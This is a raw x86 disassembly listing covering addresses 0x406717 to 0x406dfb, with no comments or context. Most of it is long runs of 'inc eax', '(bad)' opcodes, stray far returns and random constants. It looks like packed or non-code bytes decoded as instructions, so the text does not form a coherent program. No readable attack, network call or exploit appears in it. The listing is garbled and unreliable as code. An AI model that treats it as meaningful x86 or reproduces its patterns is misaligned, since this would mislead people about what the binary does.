  406717:	inc    eax
  406718:	lds    eax,FWORD PTR [eax-0x2c]
  40671b:	inc    eax
  40671c:	xor    ch,BYTE PTR [ebx+ecx*8+0x54]
  406720:	inc    eax
  406721:	inc    eax
  406722:	inc    eax
  406723:	inc    eax
  406724:	inc    eax
  406725:	inc    eax
  406726:	and    eax,0x4f404040
  40672b:	inc    eax
  40672c:	add    dh,BYTE PTR [ecx+0x62]
  40672f:	bound  eax,QWORD PTR [edi]
  406731:	inc    ecx
  406732:	inc    eax
  406733:	inc    eax
  406734:	inc    eax
  406735:	inc    eax
  406736:	inc    esp
  406737:	inc    esp
  406738:	xor    BYTE PTR [esp+eax*2+0x40],cl
  40673c:	nop
  40673d:	jp     0x406785
  40673f:	test   eax,0x404040b8
  406744:	inc    eax
  406745:	inc    eax
  406746:	inc    eax
  406747:	inc    eax
  406748:	inc    eax
  406749:	inc    eax
  40674a:	inc    eax
  40674b:	hlt    
  40674c:	cmp    BYTE PTR [eax+0x17],al
  40674f:	dec    esp
  406750:	and    DWORD PTR [ecx+0x40c36709],ebp
  406756:	sub    al,BYTE PTR [eax+0x11ddbc6b]
  40675c:	inc    esp
  40675d:	inc    eax
  40675e:	inc    ecx
  40675f:	add    DWORD PTR [edi],esp
  406761:	inc    ecx
  406762:	add    BYTE PTR [eax-0x5b],0x40
  406766:	lock cmp ch,BYTE PTR [eax-0x7f428c58]
  40676d:	inc    eax
  40676e:	inc    eax
  40676f:	inc    eax
  406770:	inc    eax
  406771:	inc    eax
  406772:	inc    eax
  406773:	rol    DWORD PTR [eax+0x40],0x40
  406777:	adc    al,BYTE PTR [eax-0x42]
  40677a:	fcom   DWORD PTR [edx+0x69]
  40677d:	bound  eax,QWORD PTR [eax+0x2e]
  406780:	sub    edi,esi
  406782:	inc    esp
  406783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406784:	imul   eax,DWORD PTR [eax+0x40],0xffffffb0
  406788:	dec    ebp
  406789:	bound  edi,QWORD PTR [ecx]
  40678b:	add    eax,0x144043c0
  406790:	add    BYTE PTR [eax-0x3d],cl
  406793:	inc    eax
  406794:	inc    eax
  406795:	add    BYTE PTR [eax+0x40],al
  406798:	inc    eax
  406799:	inc    eax
  40679a:	inc    eax
  40679b:	inc    eax
  40679c:	push   edx
  40679d:	pop    edx
  40679e:	test   eax,0x106d4240
  4067a3:	dec    esp
  4067a4:	lds    eax,FWORD PTR [eax-0x3c]
  4067a7:	inc    eax
  4067a8:	jo     0x406809
  4067aa:	fisttp QWORD PTR ds:0x404f3dcb
  4067b0:	inc    edx
  4067b1:	add    DWORD PTR [ebx+0x42],edx
  4067b4:	sar    BYTE PTR [edx+0x40],1
  4067b7:	inc    eax
  4067b8:	inc    eax
  4067b9:	inc    eax
  4067ba:	inc    eax
  4067bb:	inc    eax
  4067bc:	inc    eax
  4067bd:	inc    eax
  4067be:	inc    eax
  4067bf:	inc    eax
  4067c0:	inc    edx
  4067c1:	inc    eax
  4067c2:	jg     0x40683e
  4067c4:	adc    ebp,DWORD PTR [ebx-0x5e]
  4067c7:	lahf   
  4067c8:	lds    eax,FWORD PTR [eax+0x72]
  4067cb:	add    al,0xa8
  4067cd:	dec    esp
  4067ce:	xchg   ecx,eax
  4067cf:	push   esp
  4067d0:	mov    BYTE PTR [eax+0x40],al
  4067d3:	inc    eax
  4067d4:	inc    eax
  4067d5:	inc    eax
  4067d6:	inc    eax
  4067d7:	int3   
  4067d8:	jne    0x40681a
  4067da:	inc    eax
  4067db:	inc    edx
  4067dc:	jnp    0x4067ef
  4067de:	bound  edi,QWORD PTR [edx+edx*2+0x5671404b]
  4067e5:	mov    al,0x78
  4067e7:	adc    eax,0xed40d440
  4067ec:	inc    eax
  4067ed:	inc    ecx
  4067ee:	ret    
  4067ef:	retf   
  4067f0:	cmp    al,0x7a
  4067f2:	inc    eax
  4067f3:	inc    ecx
  4067f4:	add    al,0x65
  4067f6:	and    al,0x1
  4067f8:	inc    eax
  4067f9:	add    cl,al
  4067fb:	inc    eax
  4067fc:	inc    eax
  4067fd:	inc    eax
  4067fe:	inc    eax
  4067ff:	add    BYTE PTR [eax+0x6d],al
  406802:	scas   al,BYTE PTR es:[edi]
  406803:	inc    eax
  406804:	shl    BYTE PTR [eax+0x30],1
  406807:	xor    al,BYTE PTR [ebx-0x54]
  40680a:	test   al,0x40
  40680c:	push   cs
  40680d:	inc    eax
  40680e:	add    al,BYTE PTR [eax+0x51]
  406811:	retf   
  406812:	je     0x406854
  406814:	inc    eax
  406815:	add    BYTE PTR [ecx],bh
  406817:	inc    ebp
  406818:	cld    
  406819:	adc    eax,0x7809402a
  40681e:	test   DWORD PTR [edx+0x42],eax
  406821:	pop    edx
  406822:	inc    eax
  406823:	inc    eax
  406824:	inc    eax
  406825:	inc    eax
  406826:	inc    eax
  406827:	inc    eax
  406828:	inc    eax
  406829:	inc    eax
  40682a:	inc    DWORD PTR [eax+0x42]
  40682d:	inc    eax
  40682e:	and    DWORD PTR [eax+0x62],eax
  406831:	test   eax,0x407f8790
  406836:	xor    BYTE PTR [ebx-0x48],ah
  406839:	mov    esp,0x403c50f7
  40683e:	or     eax,0x9442a640
  406843:	test   BYTE PTR [edx+0x40],ah
  406846:	inc    eax
  406847:	jp     0x4067f2
  406849:	push   ecx
  40684a:	inc    eax
  40684b:	inc    eax
  40684c:	inc    eax
  40684d:	inc    eax
  40684e:	inc    eax
  40684f:	inc    eax
  406850:	inc    eax
  406851:	inc    eax
  406852:	inc    eax
  406853:	inc    eax
  406854:	push   ecx
  406855:	ret    
  406856:	mov    al,0x40
  406858:	pop    ds
  406859:	loopne 0x4068be
  40685b:	js     0x40683b
  40685d:	ins    DWORD PTR es:[edi],dx
  40685e:	pop    es
  40685f:	inc    eax
  406860:	enter  0xb873,0x67
  406864:	push   ss
  406865:	push   edi
  406866:	lea    eax,[eax+0x40]
  406869:	inc    eax
  40686a:	inc    eax
  40686b:	inc    eax
  40686c:	inc    eax
  40686d:	inc    eax
  40686e:	inc    eax
  40686f:	add    BYTE PTR [eax+0x40],al
  406872:	or     BYTE PTR ds:0x63525127,0x40
  406879:	shr    BYTE PTR [ebx+ecx*8],1
  40687c:	fdiv   st(5),st
  40687e:	test   DWORD PTR [edx+0x40],0x5d5cc503
  406885:	dec    edi
  406886:	in     al,0xa9
  406888:	inc    eax
  406889:	push   cs
  40688a:	inc    eax
  40688b:	inc    eax
  40688c:	inc    eax
  40688d:	inc    eax
  40688e:	inc    eax
  40688f:	inc    eax
  406890:	and    eax,0x1404040
  406895:	xor    eax,0xa00b8860
  40689a:	inc    eax
  40689b:	rol    BYTE PTR [ebp+0x42],1
  40689e:	push   edx
  40689f:	mov    esp,0x1640cd90
  4068a4:	add    DWORD PTR [ebp-0x44],ecx
  4068a7:	jmp    0x40810c0e
  4068ac:	inc    eax
  4068ad:	inc    eax
  4068ae:	inc    eax
  4068af:	inc    eax
  4068b0:	inc    eax
  4068b1:	inc    eax
  4068b2:	inc    eax
  4068b3:	inc    eax
  4068b4:	inc    eax
  4068b5:	and    BYTE PTR [ecx+0x58],bh
  4068b8:	add    eax,0x404b2aa8
  4068bd:	nop
  4068be:	adc    DWORD PTR [ebp-0x79],0x4078104c
  4068c5:	add    eax,0x27204c60
  4068ca:	push   eax
  4068cb:	test   al,0x40
  4068cd:	fs inc eax
  4068cf:	inc    eax
  4068d0:	inc    eax
  4068d1:	inc    eax
  4068d2:	inc    eax
  4068d3:	inc    eax
  4068d4:	rol    DWORD PTR [eax+0x40],0x80
  4068d8:	push   esi
  4068d9:	lods   al,BYTE PTR ds:[esi]
  4068da:	cs add eax,0x34104049
  4068e0:	and    DWORD PTR [edx+0x42],eax
  4068e3:	int    0x41
  4068e5:	inc    eax
  4068e6:	gs push 0xfffffffb
  4068e9:	icebp  
  4068ea:	jge    0x40692e
  4068ec:	ja     0x40692e
  4068ee:	jmp    0xdcd3:0x769cf801
  4068f5:	inc    eax
  4068f6:	push   eax
  4068f7:	std    
  4068f8:	test   al,0xd
  4068fa:	jne    0x406978
  4068fc:	inc    eax
  4068fd:	inc    eax
  4068fe:	add    BYTE PTR [eax+0x40],al
  406901:	inc    eax
  406902:	inc    eax
  406903:	inc    eax
  406904:	inc    eax
  406905:	imul   eax,DWORD PTR [eax-0x30],0x41
  406909:	adc    BYTE PTR [eax-0x24],dh
  40690c:	jae    0x406896
  40690e:	inc    eax
  40690f:	jno    0x406911
  406911:	mov    al,0x67
  406913:	dec    ecx
  406914:	data16 je 0x406957
  406917:	dec    edi
  406918:	and    al,BYTE PTR [edx-0x6c]
  40691b:	inc    eax
  40691c:	inc    eax
  40691d:	inc    eax
  40691e:	inc    eax
  40691f:	inc    eax
  406920:	inc    eax
  406921:	inc    eax
  406922:	inc    eax
  406923:	inc    eax
  406924:	inc    eax
  406925:	sbb    ah,bh
  406927:	lods   al,BYTE PTR ds:[esi]
  406928:	inc    eax
  406929:	rcl    BYTE PTR [eax-0x1f],cl
  40692c:	add    eax,0x40476467
  406931:	jp     0x4068b3
  406933:	inc    eax
  406934:	inc    eax
  406935:	inc    eax
  406936:	inc    eax
  406937:	inc    eax
  406938:	inc    eax
  406939:	int3   
  40693a:	jne    0x40697c
  40693c:	add    al,0xcb
  40693e:	mov    ah,0xd5
  406940:	ds inc eax
  406942:	inc    edi
  406943:	bound  esp,QWORD PTR [edx-0x70]
  406946:	add    eax,0x9140fc38
  40694b:	inc    eax
  40694c:	stc    
  40694d:	inc    ecx
  40694e:	retf   
  40694f:	push   0x0
  406951:	inc    eax
  406952:	inc    edx
  406953:	inc    eax
  406954:	add    cl,al
  406956:	inc    eax
  406957:	inc    eax
  406958:	inc    eax
  406959:	inc    eax
  40695a:	add    BYTE PTR [eax+0x7d],al
  40695d:	in     al,0x42
  40695f:	into   
  406960:	or     BYTE PTR [ebp+0x40],ah
  406963:	rol    DWORD PTR [eax+0x62],1
  406966:	sar    BYTE PTR [ebx],0x62
  406969:	inc    esp
  40696a:	inc    eax
  40696b:	dec    esp
  40696c:	inc    eax
  40696d:	inc    eax
  40696e:	inc    eax
  40696f:	inc    eax
  406970:	inc    eax
  406971:	inc    eax
  406972:	inc    eax
  406973:	inc    eax
  406974:	inc    DWORD PTR [eax+0x33]
  406977:	inc    esi
  406978:	shl    BYTE PTR [eax+edx*2-0x1f2cbf1c],0xd0
  406980:	inc    edx
  406981:	jbe    0x406998
  406983:	mov    al,BYTE PTR [eax+0x79]
  406986:	jns    0x4069da
  406988:	and    DWORD PTR ds:0x40404040,ebp
  40698e:	inc    eax
  40698f:	inc    eax
  406990:	inc    eax
  406991:	inc    eax
  406992:	inc    eax
  406993:	inc    eax
  406994:	inc    ebx
  406995:	test   al,0x40
  406997:	xor    BYTE PTR [edx],al
  406999:	pop    es
  40699a:	push   edi
  40699b:	mov    esp,0xef401051
  4069a0:	sub    al,0x36
  4069a2:	test   al,0xd
  4069a4:	retf   
  4069a5:	dec    eax
  4069a6:	inc    eax
  4069a7:	sub    DWORD PTR [ebx],esp
  4069a9:	sbb    eax,0x40404012
  4069ae:	inc    eax
  4069af:	inc    eax
  4069b0:	inc    eax
  4069b1:	inc    eax
  4069b2:	inc    eax
  4069b3:	add    bl,cl
  4069b5:	dec    esp
  4069b6:	inc    ecx
  4069b7:	inc    eax
  4069b8:	ins    BYTE PTR es:[edi],dx
  4069b9:	and    BYTE PTR [esp+ebx*4+0x50],0x43
  4069be:	inc    edi
  4069bf:	inc    eax
  4069c0:	mov    ch,0x36
  4069c2:	scas   eax,DWORD PTR es:[edi]
  4069c3:	inc    eax
  4069c4:	inc    eax
  4069c5:	inc    eax
  4069c6:	inc    eax
  4069c7:	inc    eax
  4069c8:	inc    eax
  4069c9:	and    eax,0x41404040
  4069ce:	add    eax,0x6d40a06f
  4069d3:	cmp    BYTE PTR [esp+ebp*4],dh
  4069d6:	retf   
  4069d7:	inc    eax
  4069d8:	inc    esi
  4069d9:	inc    eax
  4069da:	sbb    eax,DWORD PTR [eax+0x40]
  4069dd:	inc    eax
  4069de:	inc    eax
  4069df:	inc    eax
  4069e0:	inc    eax
  4069e1:	inc    eax
  4069e2:	inc    eax
  4069e3:	inc    eax
  4069e4:	inc    eax
  4069e5:	sub    BYTE PTR [edi],0x24
  4069e8:	dec    eax
  4069e9:	bound  ebp,QWORD PTR [eax+0x347c7d40]
  4069ef:	bound  esi,QWORD PTR [eax+esi*2]
  4069f2:	adc    al,BYTE PTR [eax+0x6d]
  4069f5:	adc    al,0x64
  4069f7:	fiadd  DWORD PTR [ebp+0x7d]
  4069fa:	dec    eax
  4069fb:	inc    eax
  4069fc:	sbb    eax,0x38bc6c11
  406a01:	sub    DWORD PTR [ecx],edx
  406a03:	inc    eax
  406a04:	loope  0x406a18
  406a06:	and    DWORD PTR [edx+0x34],0x40404040
  406a0d:	inc    eax
  406a0e:	inc    eax
  406a0f:	rol    DWORD PTR [eax+0x40],0xd0
  406a13:	retf   
  406a14:	inc    eax
  406a15:	outs   dx,BYTE PTR ds:[esi]
  406a16:	add    eax,0x8d5143c3
  406a1b:	inc    ebx
  406a1c:	inc    eax
  406a1d:	arpl   bx,bp
  406a1f:	mov    esp,0xd6fc9d0
  406a24:	inc    eax
  406a25:	bound  ecx,QWORD PTR ds:0x3eb86841
  406a2b:	and    BYTE PTR [eax+0x23],al
  406a2e:	or     esp,DWORD PTR [esi]
  406a30:	je     0x406a47
  406a32:	fs inc esp
  406a34:	inc    eax
  406a35:	inc    eax
  406a36:	add    BYTE PTR [eax+0x40],al
  406a39:	inc    eax
  406a3a:	inc    eax
  406a3b:	inc    eax
  406a3c:	inc    eax
  406a3d:	inc    eax
  406a3e:	rol    DWORD PTR [esi+0x48],cl
  406a41:	aad    0xcb
  406a43:	push   esp
  406a44:	add    al,BYTE PTR [eax-0x1b]
  406a47:	add    BYTE PTR [esi+ecx*8+0x42],ah
  406a4b:	pusha  
  406a4c:	pop    ss
  406a4d:	inc    eax
  406a4e:	aas    
  406a4f:	cs ins DWORD PTR es:[edi],dx
  406a51:	xor    BYTE PTR [ecx+ebp*2],dh
  406a54:	xor    ch,bl
  406a56:	jp     0x406ab2
  406a58:	je     0x406abe
  406a5a:	and    BYTE PTR [esp+eax*2-0x13],ah
  406a5e:	inc    eax
  406a5f:	inc    eax
  406a60:	inc    eax
  406a61:	inc    eax
  406a62:	inc    eax
  406a63:	inc    eax
  406a64:	inc    eax
  406a65:	inc    eax
  406a66:	inc    eax
  406a67:	inc    eax
  406a68:	jecxz  0x4069ec
  406a6a:	push   esp
  406a6b:	push   esp
  406a6c:	inc    eax
  406a6d:	push   0x5b
  406a6f:	rcr    bl,cl
  406a71:	outs   dx,DWORD PTR ds:[esi]
  406a72:	xchg   DWORD PTR [eax-0x5cdacb7a],ebp
  406a78:	in     al,0x40
  406a7a:	sub    DWORD PTR [eax+0x40],eax
  406a7d:	inc    eax
  406a7e:	inc    eax
  406a7f:	inc    eax
  406a80:	inc    eax
  406a81:	int3   
  406a82:	jne    0x406ac4
  406a84:	adc    bh,BYTE PTR [eax+edi*4+0x7c27d17d]
  406a8b:	cmc    
  406a8c:	lods   al,BYTE PTR ds:[esi]
  406a8d:	add    eax,0x54ceac0d
  406a92:	or     al,0x6
  406a94:	adc    eax,0x99a8c943
  406a99:	loope  0x406a26
  406a9b:	(bad)  
  406a9c:	retf   
  406a9d:	mov    eax,0x2fd8114a
  406aa2:	xchg   ecx,eax
  406aa3:	sub    BYTE PTR [ecx+0x404305],dl
  406aa9:	rol    DWORD PTR [eax+0x40],0x40
  406aad:	inc    eax
  406aae:	add    BYTE PTR [eax+0x48],al
  406ab1:	test   eax,0x44006365
  406ab6:	retf   
  406ab7:	inc    esp
  406ab8:	retf   
  406ab9:	mov    edx,0x6c630171
  406abe:	inc    eax
  406abf:	inc    eax
  406ac0:	inc    eax
  406ac1:	inc    eax
  406ac2:	inc    eax
  406ac3:	inc    eax
  406ac4:	inc    eax
  406ac5:	inc    eax
  406ac6:	inc    DWORD PTR [eax-0x6e]
  406ac9:	cmp    DWORD PTR [eax+0x1f],ecx
  406acc:	and    eax,0xbf30e44d
  406ad1:	and    al,0x5
  406ad3:	lods   al,BYTE PTR ds:[esi]
  406ad4:	inc    esp
  406ad5:	add    BYTE PTR [eax-0x34f68f7c],ch
  406adb:	mov    ecx,0xc81238e0
  406ae0:	adc    BYTE PTR [eax+esi*2],ah
  406ae3:	cmp    ch,BYTE PTR [esi+0x40406c40]
  406ae9:	inc    eax
  406aea:	inc    eax
  406aeb:	inc    eax
  406aec:	inc    eax
  406aed:	inc    eax
  406aee:	inc    eax
  406aef:	inc    eax
  406af0:	inc    eax
  406af1:	inc    edx
  406af2:	retf   
  406af3:	jns    0x406b3c
  406af5:	gs sahf 
  406af7:	and    eax,0x34bf3682
  406afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406afd:	xchg   esp,eax
  406afe:	add    eax,0xbf054262
  406b03:	adc    BYTE PTR [eax+ebx*4-0x1f],0x8b
  406b08:	adc    edi,ebp
  406b0a:	or     ebp,eax
  406b0c:	bound  esp,QWORD PTR [eax+0x40]
  406b0f:	inc    eax
  406b10:	inc    eax
  406b11:	inc    eax
  406b12:	inc    eax
  406b13:	inc    eax
  406b14:	inc    eax
  406b15:	inc    eax
  406b16:	add    BYTE PTR [ebx-0x681ac78b],dl
  406b1c:	inc    ecx
  406b1d:	pmulhw mm5,QWORD PTR [ebx+0x4e346b01]
  406b24:	dec    esp
  406b25:	cmp    al,0x34
  406b27:	push   ebx
  406b28:	adc    al,0x80
  406b2a:	jp     0x406ba7
  406b2c:	cld    
  406b2d:	jp     0x406abe
  406b2f:	popa   
  406b30:	lds    edx,FWORD PTR [edx+0x3d]
  406b33:	rol    ah,1
  406b35:	and    ah,dh
  406b37:	pusha  
  406b38:	xchg   DWORD PTR [esi],esp
  406b3a:	pop    edi
  406b3b:	inc    eax
  406b3c:	inc    eax
  406b3d:	inc    eax
  406b3e:	inc    eax
  406b3f:	inc    eax
  406b40:	inc    eax
  406b41:	and    eax,0x45404040
  406b46:	test   al,0x6f
  406b48:	scas   al,BYTE PTR es:[edi]
  406b49:	pop    ecx
  406b4a:	bound  ebp,QWORD PTR [eax]
  406b4c:	les    esi,FWORD PTR [edx+edx*1]
  406b4f:	int3   
  406b50:	push   edi
  406b51:	cli    
  406b52:	ret    0x4a62
  406b55:	ror    BYTE PTR [eax-0x5c],0xa2
  406b59:	and    al,0x35
  406b5b:	(bad)
  406b5e:	inc    ecx
  406b5f:	add    eax,0x4f5e3a2d
  406b64:	sbb    edi,DWORD PTR [esi+esi*2-0x35]
  406b68:	and    BYTE PTR [ecx-0x40],al
  406b6b:	sbb    DWORD PTR [eax+0x40],eax
  406b6e:	inc    eax
  406b6f:	inc    eax
  406b70:	inc    eax
  406b71:	inc    eax
  406b72:	inc    eax
  406b73:	inc    eax
  406b74:	inc    eax
  406b75:	inc    eax
  406b76:	jp     0x406bf2
  406b78:	mov    al,ds:0x23a11a98
  406b7d:	push   cs
  406b7e:	std    
  406b7f:	icebp  
  406b80:	fs out 0xf0,eax
  406b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b84:	retf   0x4040
  406b87:	inc    eax
  406b88:	inc    eax
  406b89:	inc    eax
  406b8a:	inc    eax
  406b8b:	rol    DWORD PTR [eax+0x40],0x66
  406b8f:	mov    BYTE PTR [ebx+0x48],ah
  406b92:	jg     0x406b3f
  406b94:	push   esp
  406b95:	shr    edi,0x5
  406b98:	pushf  
  406b99:	or     bh,ah
  406b9b:	cdq    
  406b9c:	and    ebp,ebp
  406b9e:	test   al,0xcb
  406ba0:	clc    
  406ba1:	test   ebp,eax
  406ba3:	sub    BYTE PTR [ecx-0x37],0x10
  406ba7:	pop    esi
  406ba8:	inc    esp
  406ba9:	bound  ebp,QWORD PTR [edx]
  406bab:	cwde   
  406bac:	jecxz  0x406c0f
  406bae:	ins    BYTE PTR es:[edi],dx
  406baf:	inc    eax
  406bb0:	inc    eax
  406bb1:	add    BYTE PTR [eax+0x40],al
  406bb4:	inc    eax
  406bb5:	inc    eax
  406bb6:	inc    eax
  406bb7:	inc    eax
  406bb8:	aas    
  406bb9:	cmp    dl,BYTE PTR ds:0xc14c9334
  406bbf:	sub    BYTE PTR [edi-0x2a],0xab
  406bc3:	push   eax
  406bc4:	fbld   TBYTE PTR [edx+0x11ab4246]
  406bca:	inc    eax
  406bcb:	inc    eax
  406bcc:	inc    eax
  406bcd:	inc    eax
  406bce:	inc    eax
  406bcf:	inc    eax
  406bd0:	inc    eax
  406bd1:	inc    eax
  406bd2:	inc    eax
  406bd3:	inc    eax
  406bd4:	mov    esp,0xc0a849ab
  406bd9:	add    DWORD PTR [esp+esi*1+0x68],eax
  406bdd:	ret    
  406bde:	inc    eax
  406bdf:	inc    ebx
  406be0:	out    dx,eax
  406be1:	lods   al,BYTE PTR ds:[esi]
  406be2:	xor    al,BYTE PTR [eax-0x29]
  406be5:	(bad)  
  406be6:	jo     0x406c48
  406be8:	xor    esp,DWORD PTR [edx-0x6c]
  406beb:	mov    esp,0x405b0554
  406bf0:	inc    eax
  406bf1:	inc    eax
  406bf2:	inc    eax
  406bf3:	inc    eax
  406bf4:	inc    eax
  406bf5:	int3   
  406bf6:	jne    0x406c38
  406bf8:	and    eax,DWORD PTR [ebp+0x59]
  406bfb:	sar    BYTE PTR ds:0x65b087fd,0xc1
  406c02:	dec    esp
  406c03:	xor    eax,0x6a7b25c3
  406c08:	mov    ds:0xbca4557d,eax
  406c0d:	arpl   WORD PTR [edx],bx
  406c0f:	mov    al,0x2
  406c11:	ret    
  406c12:	enter  0x447b,0x50
  406c16:	arpl   WORD PTR [eax],ax
  406c18:	stos   BYTE PTR es:[edi],al
  406c19:	fld    DWORD PTR [eax+0x0]
  406c1c:	rol    DWORD PTR [eax+0x40],0x40
  406c20:	inc    eax
  406c21:	add    BYTE PTR [eax-0x48],al
  406c24:	lds    edx,FWORD PTR [edx+0x68]
  406c27:	push   esp
  406c28:	fisubr DWORD PTR [ebx-0x5fd39d39]
  406c2e:	xor    eax,0xcb234305
  406c33:	(bad)
  406c36:	jne    0x406c03
  406c38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c39:	inc    ebp
  406c3a:	lds    ecx,FWORD PTR [edi+0x62]
  406c3d:	push   edx
  406c3e:	mov    al,ds:0x2d602951
  406c43:	push   eax
  406c44:	inc    ebx
  406c45:	shl    DWORD PTR [ebx-0x37],0xb5
  406c49:	inc    eax
  406c4a:	inc    eax
  406c4b:	inc    eax
  406c4c:	inc    eax
  406c4d:	inc    eax
  406c4e:	inc    eax
  406c4f:	inc    eax
  406c50:	inc    eax
  406c51:	inc    DWORD PTR [eax+0x32]
  406c54:	ret    0x88a2
  406c57:	sub    DWORD PTR [edi+0x42],esp
  406c5a:	fisttp WORD PTR [eax+0x32]
  406c5d:	ret    
  406c5e:	push   0xd183dcab
  406c63:	mov    eax,ds:0x40405106
  406c68:	inc    eax
  406c69:	inc    eax
  406c6a:	inc    eax
  406c6b:	inc    eax
  406c6c:	inc    eax
  406c6d:	inc    eax
  406c6e:	inc    eax
  406c6f:	inc    eax
  406c70:	(bad)  [ebx+edi*2-0x3dfa27c4]
  406c77:	inc    ebx
  406c78:	or     al,0x49
  406c7a:	fmul   DWORD PTR ds:0x13de12e
  406c80:	bound  edi,QWORD PTR [edi]
  406c82:	inc    eax
  406c83:	inc    eax
  406c84:	inc    eax
  406c85:	inc    eax
  406c86:	inc    eax
  406c87:	inc    eax
  406c88:	inc    eax
  406c89:	inc    eax
  406c8a:	add    BYTE PTR [edi-0x35],ah
  406c8d:	popa   
  406c8e:	push   eax
  406c8f:	xor    esp,DWORD PTR [edi+edi*1]
  406c92:	jo     0x406c70
  406c94:	pop    ecx
  406c95:	push   ds
  406c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c97:	jecxz  0x406cfb
  406c99:	xor    al,0xb4
  406c9b:	inc    ecx
  406c9c:	xor    eax,0x40404040
  406ca1:	inc    eax
  406ca2:	inc    eax
  406ca3:	and    eax,0x9d404040
  406ca8:	or     ch,al
  406caa:	daa    
  406cab:	or     DWORD PTR ds:0xe1bbbc3c,eax
  406cb1:	fmulp  st(4),st
  406cb3:	mov    esp,0x12054287
  406cb8:	popa   
  406cb9:	les    esp,FWORD PTR [ebx+0x62]
  406cbc:	inc    eax
  406cbd:	inc    eax
  406cbe:	inc    eax
  406cbf:	inc    eax
  406cc0:	inc    eax
  406cc1:	inc    eax
  406cc2:	inc    eax
  406cc3:	inc    eax
  406cc4:	inc    eax
  406cc5:	inc    eax
  406cc6:	dec    esp
  406cc7:	pusha  
  406cc8:	jnp    0x406c5c
  406cca:	loop   0x406cf8
  406ccc:	aas    
  406ccd:	pop    es
  406cce:	lods   al,BYTE PTR ds:[esi]
  406ccf:	inc    ecx
  406cd0:	mov    ah,0x5a
  406cd2:	pop    ds
  406cd3:	paddusb mm7,QWORD PTR [ebx+eax*8+0x256145c0]
  406cdb:	rol    ah,0x62
  406cde:	inc    ebx
  406cdf:	addr16 popf 
  406ce1:	inc    ebx
  406ce2:	push   ecx
  406ce3:	and    DWORD PTR [eax+0x40],eax
  406ce6:	inc    eax
  406ce7:	inc    eax
  406ce8:	inc    eax
  406ce9:	inc    eax
  406cea:	rol    DWORD PTR [eax+0x40],0x4c
  406cee:	xor    eax,0x58d0484e
  406cf3:	and    esi,DWORD PTR [ecx-0x6f]
  406cf6:	mov    al,ds:0x1e63727c
  406cfb:	push   edx
  406cfc:	lds    edx,FWORD PTR [esi-0x25]
  406cff:	push   0x267a71d1
  406d04:	daa    
  406d05:	leave  
  406d06:	jb     0x406cfa
  406d08:	lods   al,BYTE PTR ds:[esi]
  406d09:	test   eax,0x90c31048
  406d0e:	bound  ebp,QWORD PTR [ebx+0x404072]
  406d14:	inc    eax
  406d15:	inc    eax
  406d16:	int3   
  406d17:	int3   
  406d18:	int3   
  406d19:	int3   
  406d1a:	int3   
  406d1b:	int3   
  406d1c:	int3   
  406d1d:	int3   
  406d1e:	int3   
  406d1f:	int3   
  406d20:	inc    eax
  406d21:	inc    eax
  406d22:	inc    eax
  406d23:	inc    eax
  406d24:	cli    
  406d25:	call   FWORD PTR [eax]
  406d27:	sub    edi,DWORD PTR [edi-0x542ebd35]
  406d2d:	xchg   edx,eax
  406d2e:	jmp    0x406d1e
  406d30:	fadd   QWORD PTR [eax+0x40]
  406d33:	inc    eax
  406d34:	inc    eax
  406d35:	inc    eax
  406d36:	inc    eax
  406d37:	inc    eax
  406d38:	inc    eax
  406d39:	inc    eax
  406d3a:	inc    eax
  406d3b:	pop    eax
  406d3c:	stos   DWORD PTR es:[edi],eax
  406d3d:	inc    ebx
  406d3e:	test   al,0x82
  406d40:	push   edi
  406d41:	ret    0x676b
  406d44:	mov    edi,0x61e042dc
  406d49:	aaa    
  406d4a:	bound  ebp,QWORD PTR [edx]
  406d4c:	mov    edi,0xeee7a14b
  406d51:	add    BYTE PTR [ebp+0x5f],0xbf
  406d55:	cld    
  406d56:	pop    eax
  406d57:	sub    ah,BYTE PTR [ebp-0x3d]
  406d5a:	fmul   st,st(4)
  406d5c:	mov    edi,0x528b6340
  406d61:	cmc    
  406d62:	inc    eax
  406d63:	inc    eax
  406d64:	inc    eax
  406d65:	inc    eax
  406d66:	inc    eax
  406d67:	inc    eax
  406d68:	int3   
  406d69:	jne    0x406dab
  406d6b:	or     al,0xd0
  406d6d:	mov    eax,0x2112a8c8
  406d72:	shr    DWORD PTR [eax+0x156c0544],0xe0
  406d79:	das    
  406d7a:	inc    ebx
  406d7b:	adc    ch,BYTE PTR [ecx]
  406d7d:	inc    eax
  406d7e:	add    cl,al
  406d80:	inc    eax
  406d81:	inc    eax
  406d82:	inc    eax
  406d83:	inc    eax
  406d84:	add    BYTE PTR [eax-0x79],al
  406d87:	cmc    
  406d88:	retf   
  406d89:	imul   eax,DWORD PTR [ebx-0x40],0xd449eeb4
  406d90:	mov    esp,0x41246252
  406d95:	test   al,0xab
  406d97:	add    BYTE PTR [ecx-0x1a],0x38
  406d9b:	imul   edx,DWORD PTR [edi],0x11
  406d9e:	mov    eax,0x404052a8
  406da3:	inc    eax
  406da4:	inc    eax
  406da5:	inc    eax
  406da6:	inc    eax
  406da7:	inc    eax
  406da8:	inc    eax
  406da9:	inc    DWORD PTR [eax+0x6]
  406dac:	sub    eax,ebp
  406dae:	mov    BYTE PTR [eax-0x8279cf3],bh
  406db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406db5:	mul    DWORD PTR [edx+0x41]
  406db8:	leave  
  406db9:	pop    edx
  406dba:	inc    eax
  406dbb:	inc    eax
  406dbc:	inc    eax
  406dbd:	inc    eax
  406dbe:	inc    eax
  406dbf:	inc    eax
  406dc0:	inc    eax
  406dc1:	inc    eax
  406dc2:	inc    eax
  406dc3:	inc    eax
  406dc4:	mov    esp,0x58c256c2
  406dc9:	fist   DWORD PTR [eax-0x1e58f2ae]
  406dcf:	sti    
  406dd0:	ror    BYTE PTR [eax-0x7a3432bf],0x26
  406dd7:	xor    edx,DWORD PTR [edx+0x62]
  406dda:	or     al,0x48
  406ddc:	mov    ah,0xef
  406dde:	and    eax,DWORD PTR [ecx]
  406de0:	inc    ecx
  406de1:	inc    esp
  406de2:	int    0x5
  406de4:	inc    ecx
  406de5:	mov    ds:0x40404040,eax
  406dea:	inc    eax
  406deb:	inc    eax
  406dec:	inc    eax
  406ded:	inc    eax
  406dee:	add    BYTE PTR [edx-0x3f],al
  406df1:	repnz cmp BYTE PTR [edx-0x35],al
  406df5:	push   edx
  406df6:	cmp    eax,0xaac40021
  406dfb:	inc    eax
